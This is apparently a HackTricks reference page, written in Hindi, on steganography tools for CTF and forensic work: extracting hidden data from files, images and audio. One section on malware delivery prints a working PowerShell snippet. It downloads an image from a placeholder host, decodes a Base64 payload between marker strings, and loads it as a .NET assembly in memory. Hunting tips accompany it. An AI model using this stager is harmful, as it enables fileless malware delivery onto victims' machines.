# Stego ट्रिक्स

{{#include ../banners/hacktricks-training.md}}

## **फ़ाइलों से डेटा निकालना**

### **Binwalk**

बाइनरी फ़ाइलों में निहित छुपी हुई फ़ाइलों और डेटा की खोज के लिए एक टूल। इसे `apt` के जरिए इंस्टॉल किया जाता है और इसका सोर्स [GitHub](https://github.com/ReFirmLabs/binwalk) पर उपलब्ध है।
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

यह फ़ाइलों को उनके हेडर और फुटर के आधार पर रिकवर करता है, png इमेज के लिए उपयोगी। `apt` के माध्यम से इंस्टॉल किया जाता है और इसका स्रोत [GitHub](https://github.com/korczis/foremost) पर है।
```bash
foremost -i file # Extracts data
```
### **Exiftool**

फाइल मेटाडेटा देखने में मदद करता है, available [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

exiftool के समान, मेटाडेटा देखने के लिए। `apt` के माध्यम से इंस्टॉल किया जा सकता है, स्रोत [GitHub](https://github.com/Exiv2/exiv2), और इसका एक [official website](http://www.exiv2.org/) है।
```bash
exiv2 file # Shows the metadata
```
### **फ़ाइल**

पहचानें कि आप किस प्रकार की फ़ाइल से निपट रहे हैं।

### **Strings**

फाइलों से पठनीय strings निकालता है, और आउटपुट को फ़िल्टर करने के लिए विभिन्न encoding सेटिंग्स का उपयोग करता है।
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

ऑनलाइन पाए गए उसके मूल संस्करण के साथ एक संशोधित फ़ाइल की तुलना करने के लिए उपयोगी।
```bash
cmp original.jpg stego.jpg -b -l
```
## **पाठ में छिपा हुआ डेटा निकालना**

### **खाली स्थानों में छिपा हुआ डेटा**

दिखने में खाली स्थानों में अदृश्य कैरैक्टर जानकारी छिपा सकते हैं। इस डेटा को निकालने के लिए जाएँ: [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **छवियों से डेटा निकालना**

### **GraphicMagick के साथ इमेज विवरण पहचानना**

GraphicMagick का उपयोग इमेज फ़ाइल प्रकार निर्धारित करने और संभावित भ्रष्टाचार की पहचान करने के लिए किया जाता है। किसी इमेज का निरीक्षण करने के लिए नीचे दिया गया कमांड चलाएँ:
```bash
./magick identify -verbose stego.jpg
```
एक क्षतिग्रस्त छवि की मरम्मत का प्रयास करने के लिए, metadata comment जोड़ने से मदद मिल सकती है:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide डेटा छुपाने के लिए**

Steghide `JPEG, BMP, WAV, and AU` फाइलों के भीतर डेटा छिपाने की सुविधा देता है, और एन्क्रिप्टेड डेटा को एम्बेड और एक्सट्रैक्ट करने में सक्षम है। इंस्टॉलेशन `apt` के माध्यम से सरल है, और इसका [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Commands:**

- `steghide info file` यह बताता है कि किसी फाइल में छिपा हुआ डेटा है या नहीं।
- `steghide extract -sf file [--passphrase password]` छिपा हुआ डेटा निकालता है, पासवर्ड वैकल्पिक है।

वेब-आधारित extraction के लिए, visit [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Steghide पर password cracking करने के लिए, [stegcracker](https://github.com/Paradoxis/StegCracker.git) का उपयोग इस तरह करें:
```bash
stegcracker <file> [<wordlist>]
```
### **PNG और BMP फाइलों के लिए zsteg**

zsteg PNG और BMP फाइलों में छिपा डेटा खोजने में विशेषज्ञ है। इंस्टॉलेशन `gem install zsteg` के माध्यम से किया जाता है, with its [source on GitHub](https://github.com/zed-0xff/zsteg).

**Commands:**

- `zsteg -a file` एक फाइल पर सभी डिटेक्शन विधियों को लागू करता है।
- `zsteg -E file` डेटा निकालने के लिए payload निर्दिष्ट करता है।

### **StegoVeritas और Stegsolve**

**stegoVeritas** metadata की जाँच करता है, image transformations करता है, और LSB brute forcing लागू करता है साथ ही अन्य सुविधाएँ भी हैं। सभी विकल्पों की पूरी सूची के लिए `stegoveritas.py -h` का उपयोग करें और सभी जाँचें चलाने के लिए `stegoveritas.py stego.jpg`।

**Stegsolve** इमेज के भीतर छिपे टेक्स्ट या संदेशों को उजागर करने के लिए विभिन्न कलर फ़िल्टर्स लागू करता है। यह [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) पर उपलब्ध है।

### **छिपे हुए कंटेंट का पता लगाने के लिए FFT**

Fast Fourier Transform (FFT) तकनीकें इमेज में छिपी सामग्री उजागर कर सकती हैं। उपयोगी संसाधन:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Audio और Image फाइलों के लिए Stegpy**

Stegpy इमेज और ऑडियो फाइलों में जानकारी embed करने की अनुमति देता है, और यह PNG, BMP, GIF, WebP, और WAV जैसे फॉर्मैट्स को सपोर्ट करता है। यह [GitHub](https://github.com/dhsdshdhk/stegpy) पर उपलब्ध है।

### **PNG फ़ाइल विश्लेषण के लिए Pngcheck**

PNG फाइलों का विश्लेषण करने या उनकी प्रामाणिकता सत्यापित करने के लिए, उपयोग करें:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Image Analysis के लिए अतिरिक्त उपकरण**

और अन्वेषण के लिए, निम्न पर जाएँ:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Marker-delimited Base64 payloads जो images में छिपाए जाते हैं (malware delivery)

Commodity loaders अक्सर वैध images (अक्सर GIF/PNG) के भीतर प्लेन टेक्स्ट के रूप में Base64-encoded payloads छिपाते हैं। Pixel-level LSB के बजाय, payload को file text/metadata में embedded unique start/end marker strings द्वारा delimit किया जाता है। फिर एक PowerShell stager:

- image को HTTP(S) के माध्यम से डाउनलोड करता है
- marker strings का पता लगाता है (observed उदाहरण: <<sudo_png>> … <<sudo_odt>>)
- बीच का टेक्स्ट निकालता है और Base64-decode करके bytes बनाता है
- .NET assembly को in-memory load करता है और किसी ज्ञात entry method को invoke करता है (कोई फ़ाइल डिस्क पर नहीं लिखी जाती)

Minimal PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
नोट्स
- यह ATT&CK T1027.003 (steganography) के अंतर्गत आता है। Marker strings अभियानों के बीच भिन्न हो सकते हैं।
- Hunting: डाउनलोड की गई छवियों को ज्ञात delimiters के लिए स्कैन करें; `PowerShell` को तब फ़्लैग करें जब वह `DownloadString` के बाद `FromBase64String` का उपयोग कर रहा हो।

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **ऑडियो से डेटा निकालना**

**Audio steganography** ध्वनि फ़ाइलों के भीतर जानकारी छिपाने का एक अनूठा तरीका प्रदान करती है। छिपाया हुआ सामग्री एम्बेड करने या पुनःप्राप्त करने के लिए विभिन्न उपकरण उपयोग में लाए जाते हैं।

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide एक बहुमुखी टूल है जो JPEG, BMP, WAV, और AU फ़ाइलों में डेटा छिपाने के लिए बनाया गया है। विस्तृत निर्देश [stego tricks documentation](stego-tricks.md#steghide) में दिए गए हैं।

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

यह टूल PNG, BMP, GIF, WebP, और WAV सहित विभिन्न फॉर्मैट्स के साथ संगत है। अधिक जानकारी के लिए देखें [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav)।

### **ffmpeg**

ffmpeg ऑडियो फ़ाइलों की integrity का मूल्यांकन करने के लिए महत्वपूर्ण है, विस्तृत जानकारी उजागर करता है और किसी भी विसंगति का पता लगाता है।
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg WAV फ़ाइलों के भीतर डेटा को छिपाने और निकालने में माहिर है, जो least significant bit strategy का उपयोग करता है। यह [GitHub](https://github.com/ragibson/Steganography#WavSteg) पर उपलब्ध है। कमांड्स में शामिल हैं:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound आपको AES-256 का उपयोग करके sound files में जानकारी को एन्क्रिप्ट और डिटेक्ट करने की अनुमति देता है। इसे [the official page](http://jpinsoft.net/deepsound/download.aspx) से डाउनलोड किया जा सकता है।

### **Sonic Visualizer**

ऑडियो फाइलों के दृश्य और विश्लेषणात्मक निरीक्षण के लिए एक अमूल्य उपकरण, Sonic Visualizer अन्य तरीकों से अनदेखी छिपी हुई चीज़ों को उजागर कर सकता है। अधिक जानकारी के लिए [the official website](https://www.sonicvisualiser.org/) पर जाएँ।

### **DTMF Tones - Dial Tones**

ऑडियो फाइलों में DTMF tones का पता ऑनलाइन टूल्स जैसे [this DTMF detector](https://unframework.github.io/dtmf-detect/) और [DialABC](http://dialabc.com/sound/detect/index.html) के माध्यम से लगाया जा सकता है।

## **Other Techniques**

### **Binary Length SQRT - QR Code**

Binary data जिसकी लंबाई का वर्गमूल (sqrt) एक पूर्ण संख्या हो, संभवतः QR code का प्रतिनिधित्व कर सकती है। इसे जांचने के लिए यह snippet उपयोग करें:
```python
import math
math.sqrt(2500) #50
```
बाइनरी को इमेज में बदलने के लिए, [dcode](https://www.dcode.fr/binary-image) देखें। QR कोड पढ़ने के लिए, [this online barcode reader](https://online-barcode-reader.inliteresearch.com/) का उपयोग करें।

### **ब्रेल अनुवाद**

ब्रेल का अनुवाद करने के लिए, [Branah Braille Translator](https://www.branah.com/braille-translator) एक उत्कृष्ट संसाधन है।

## **संदर्भ**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
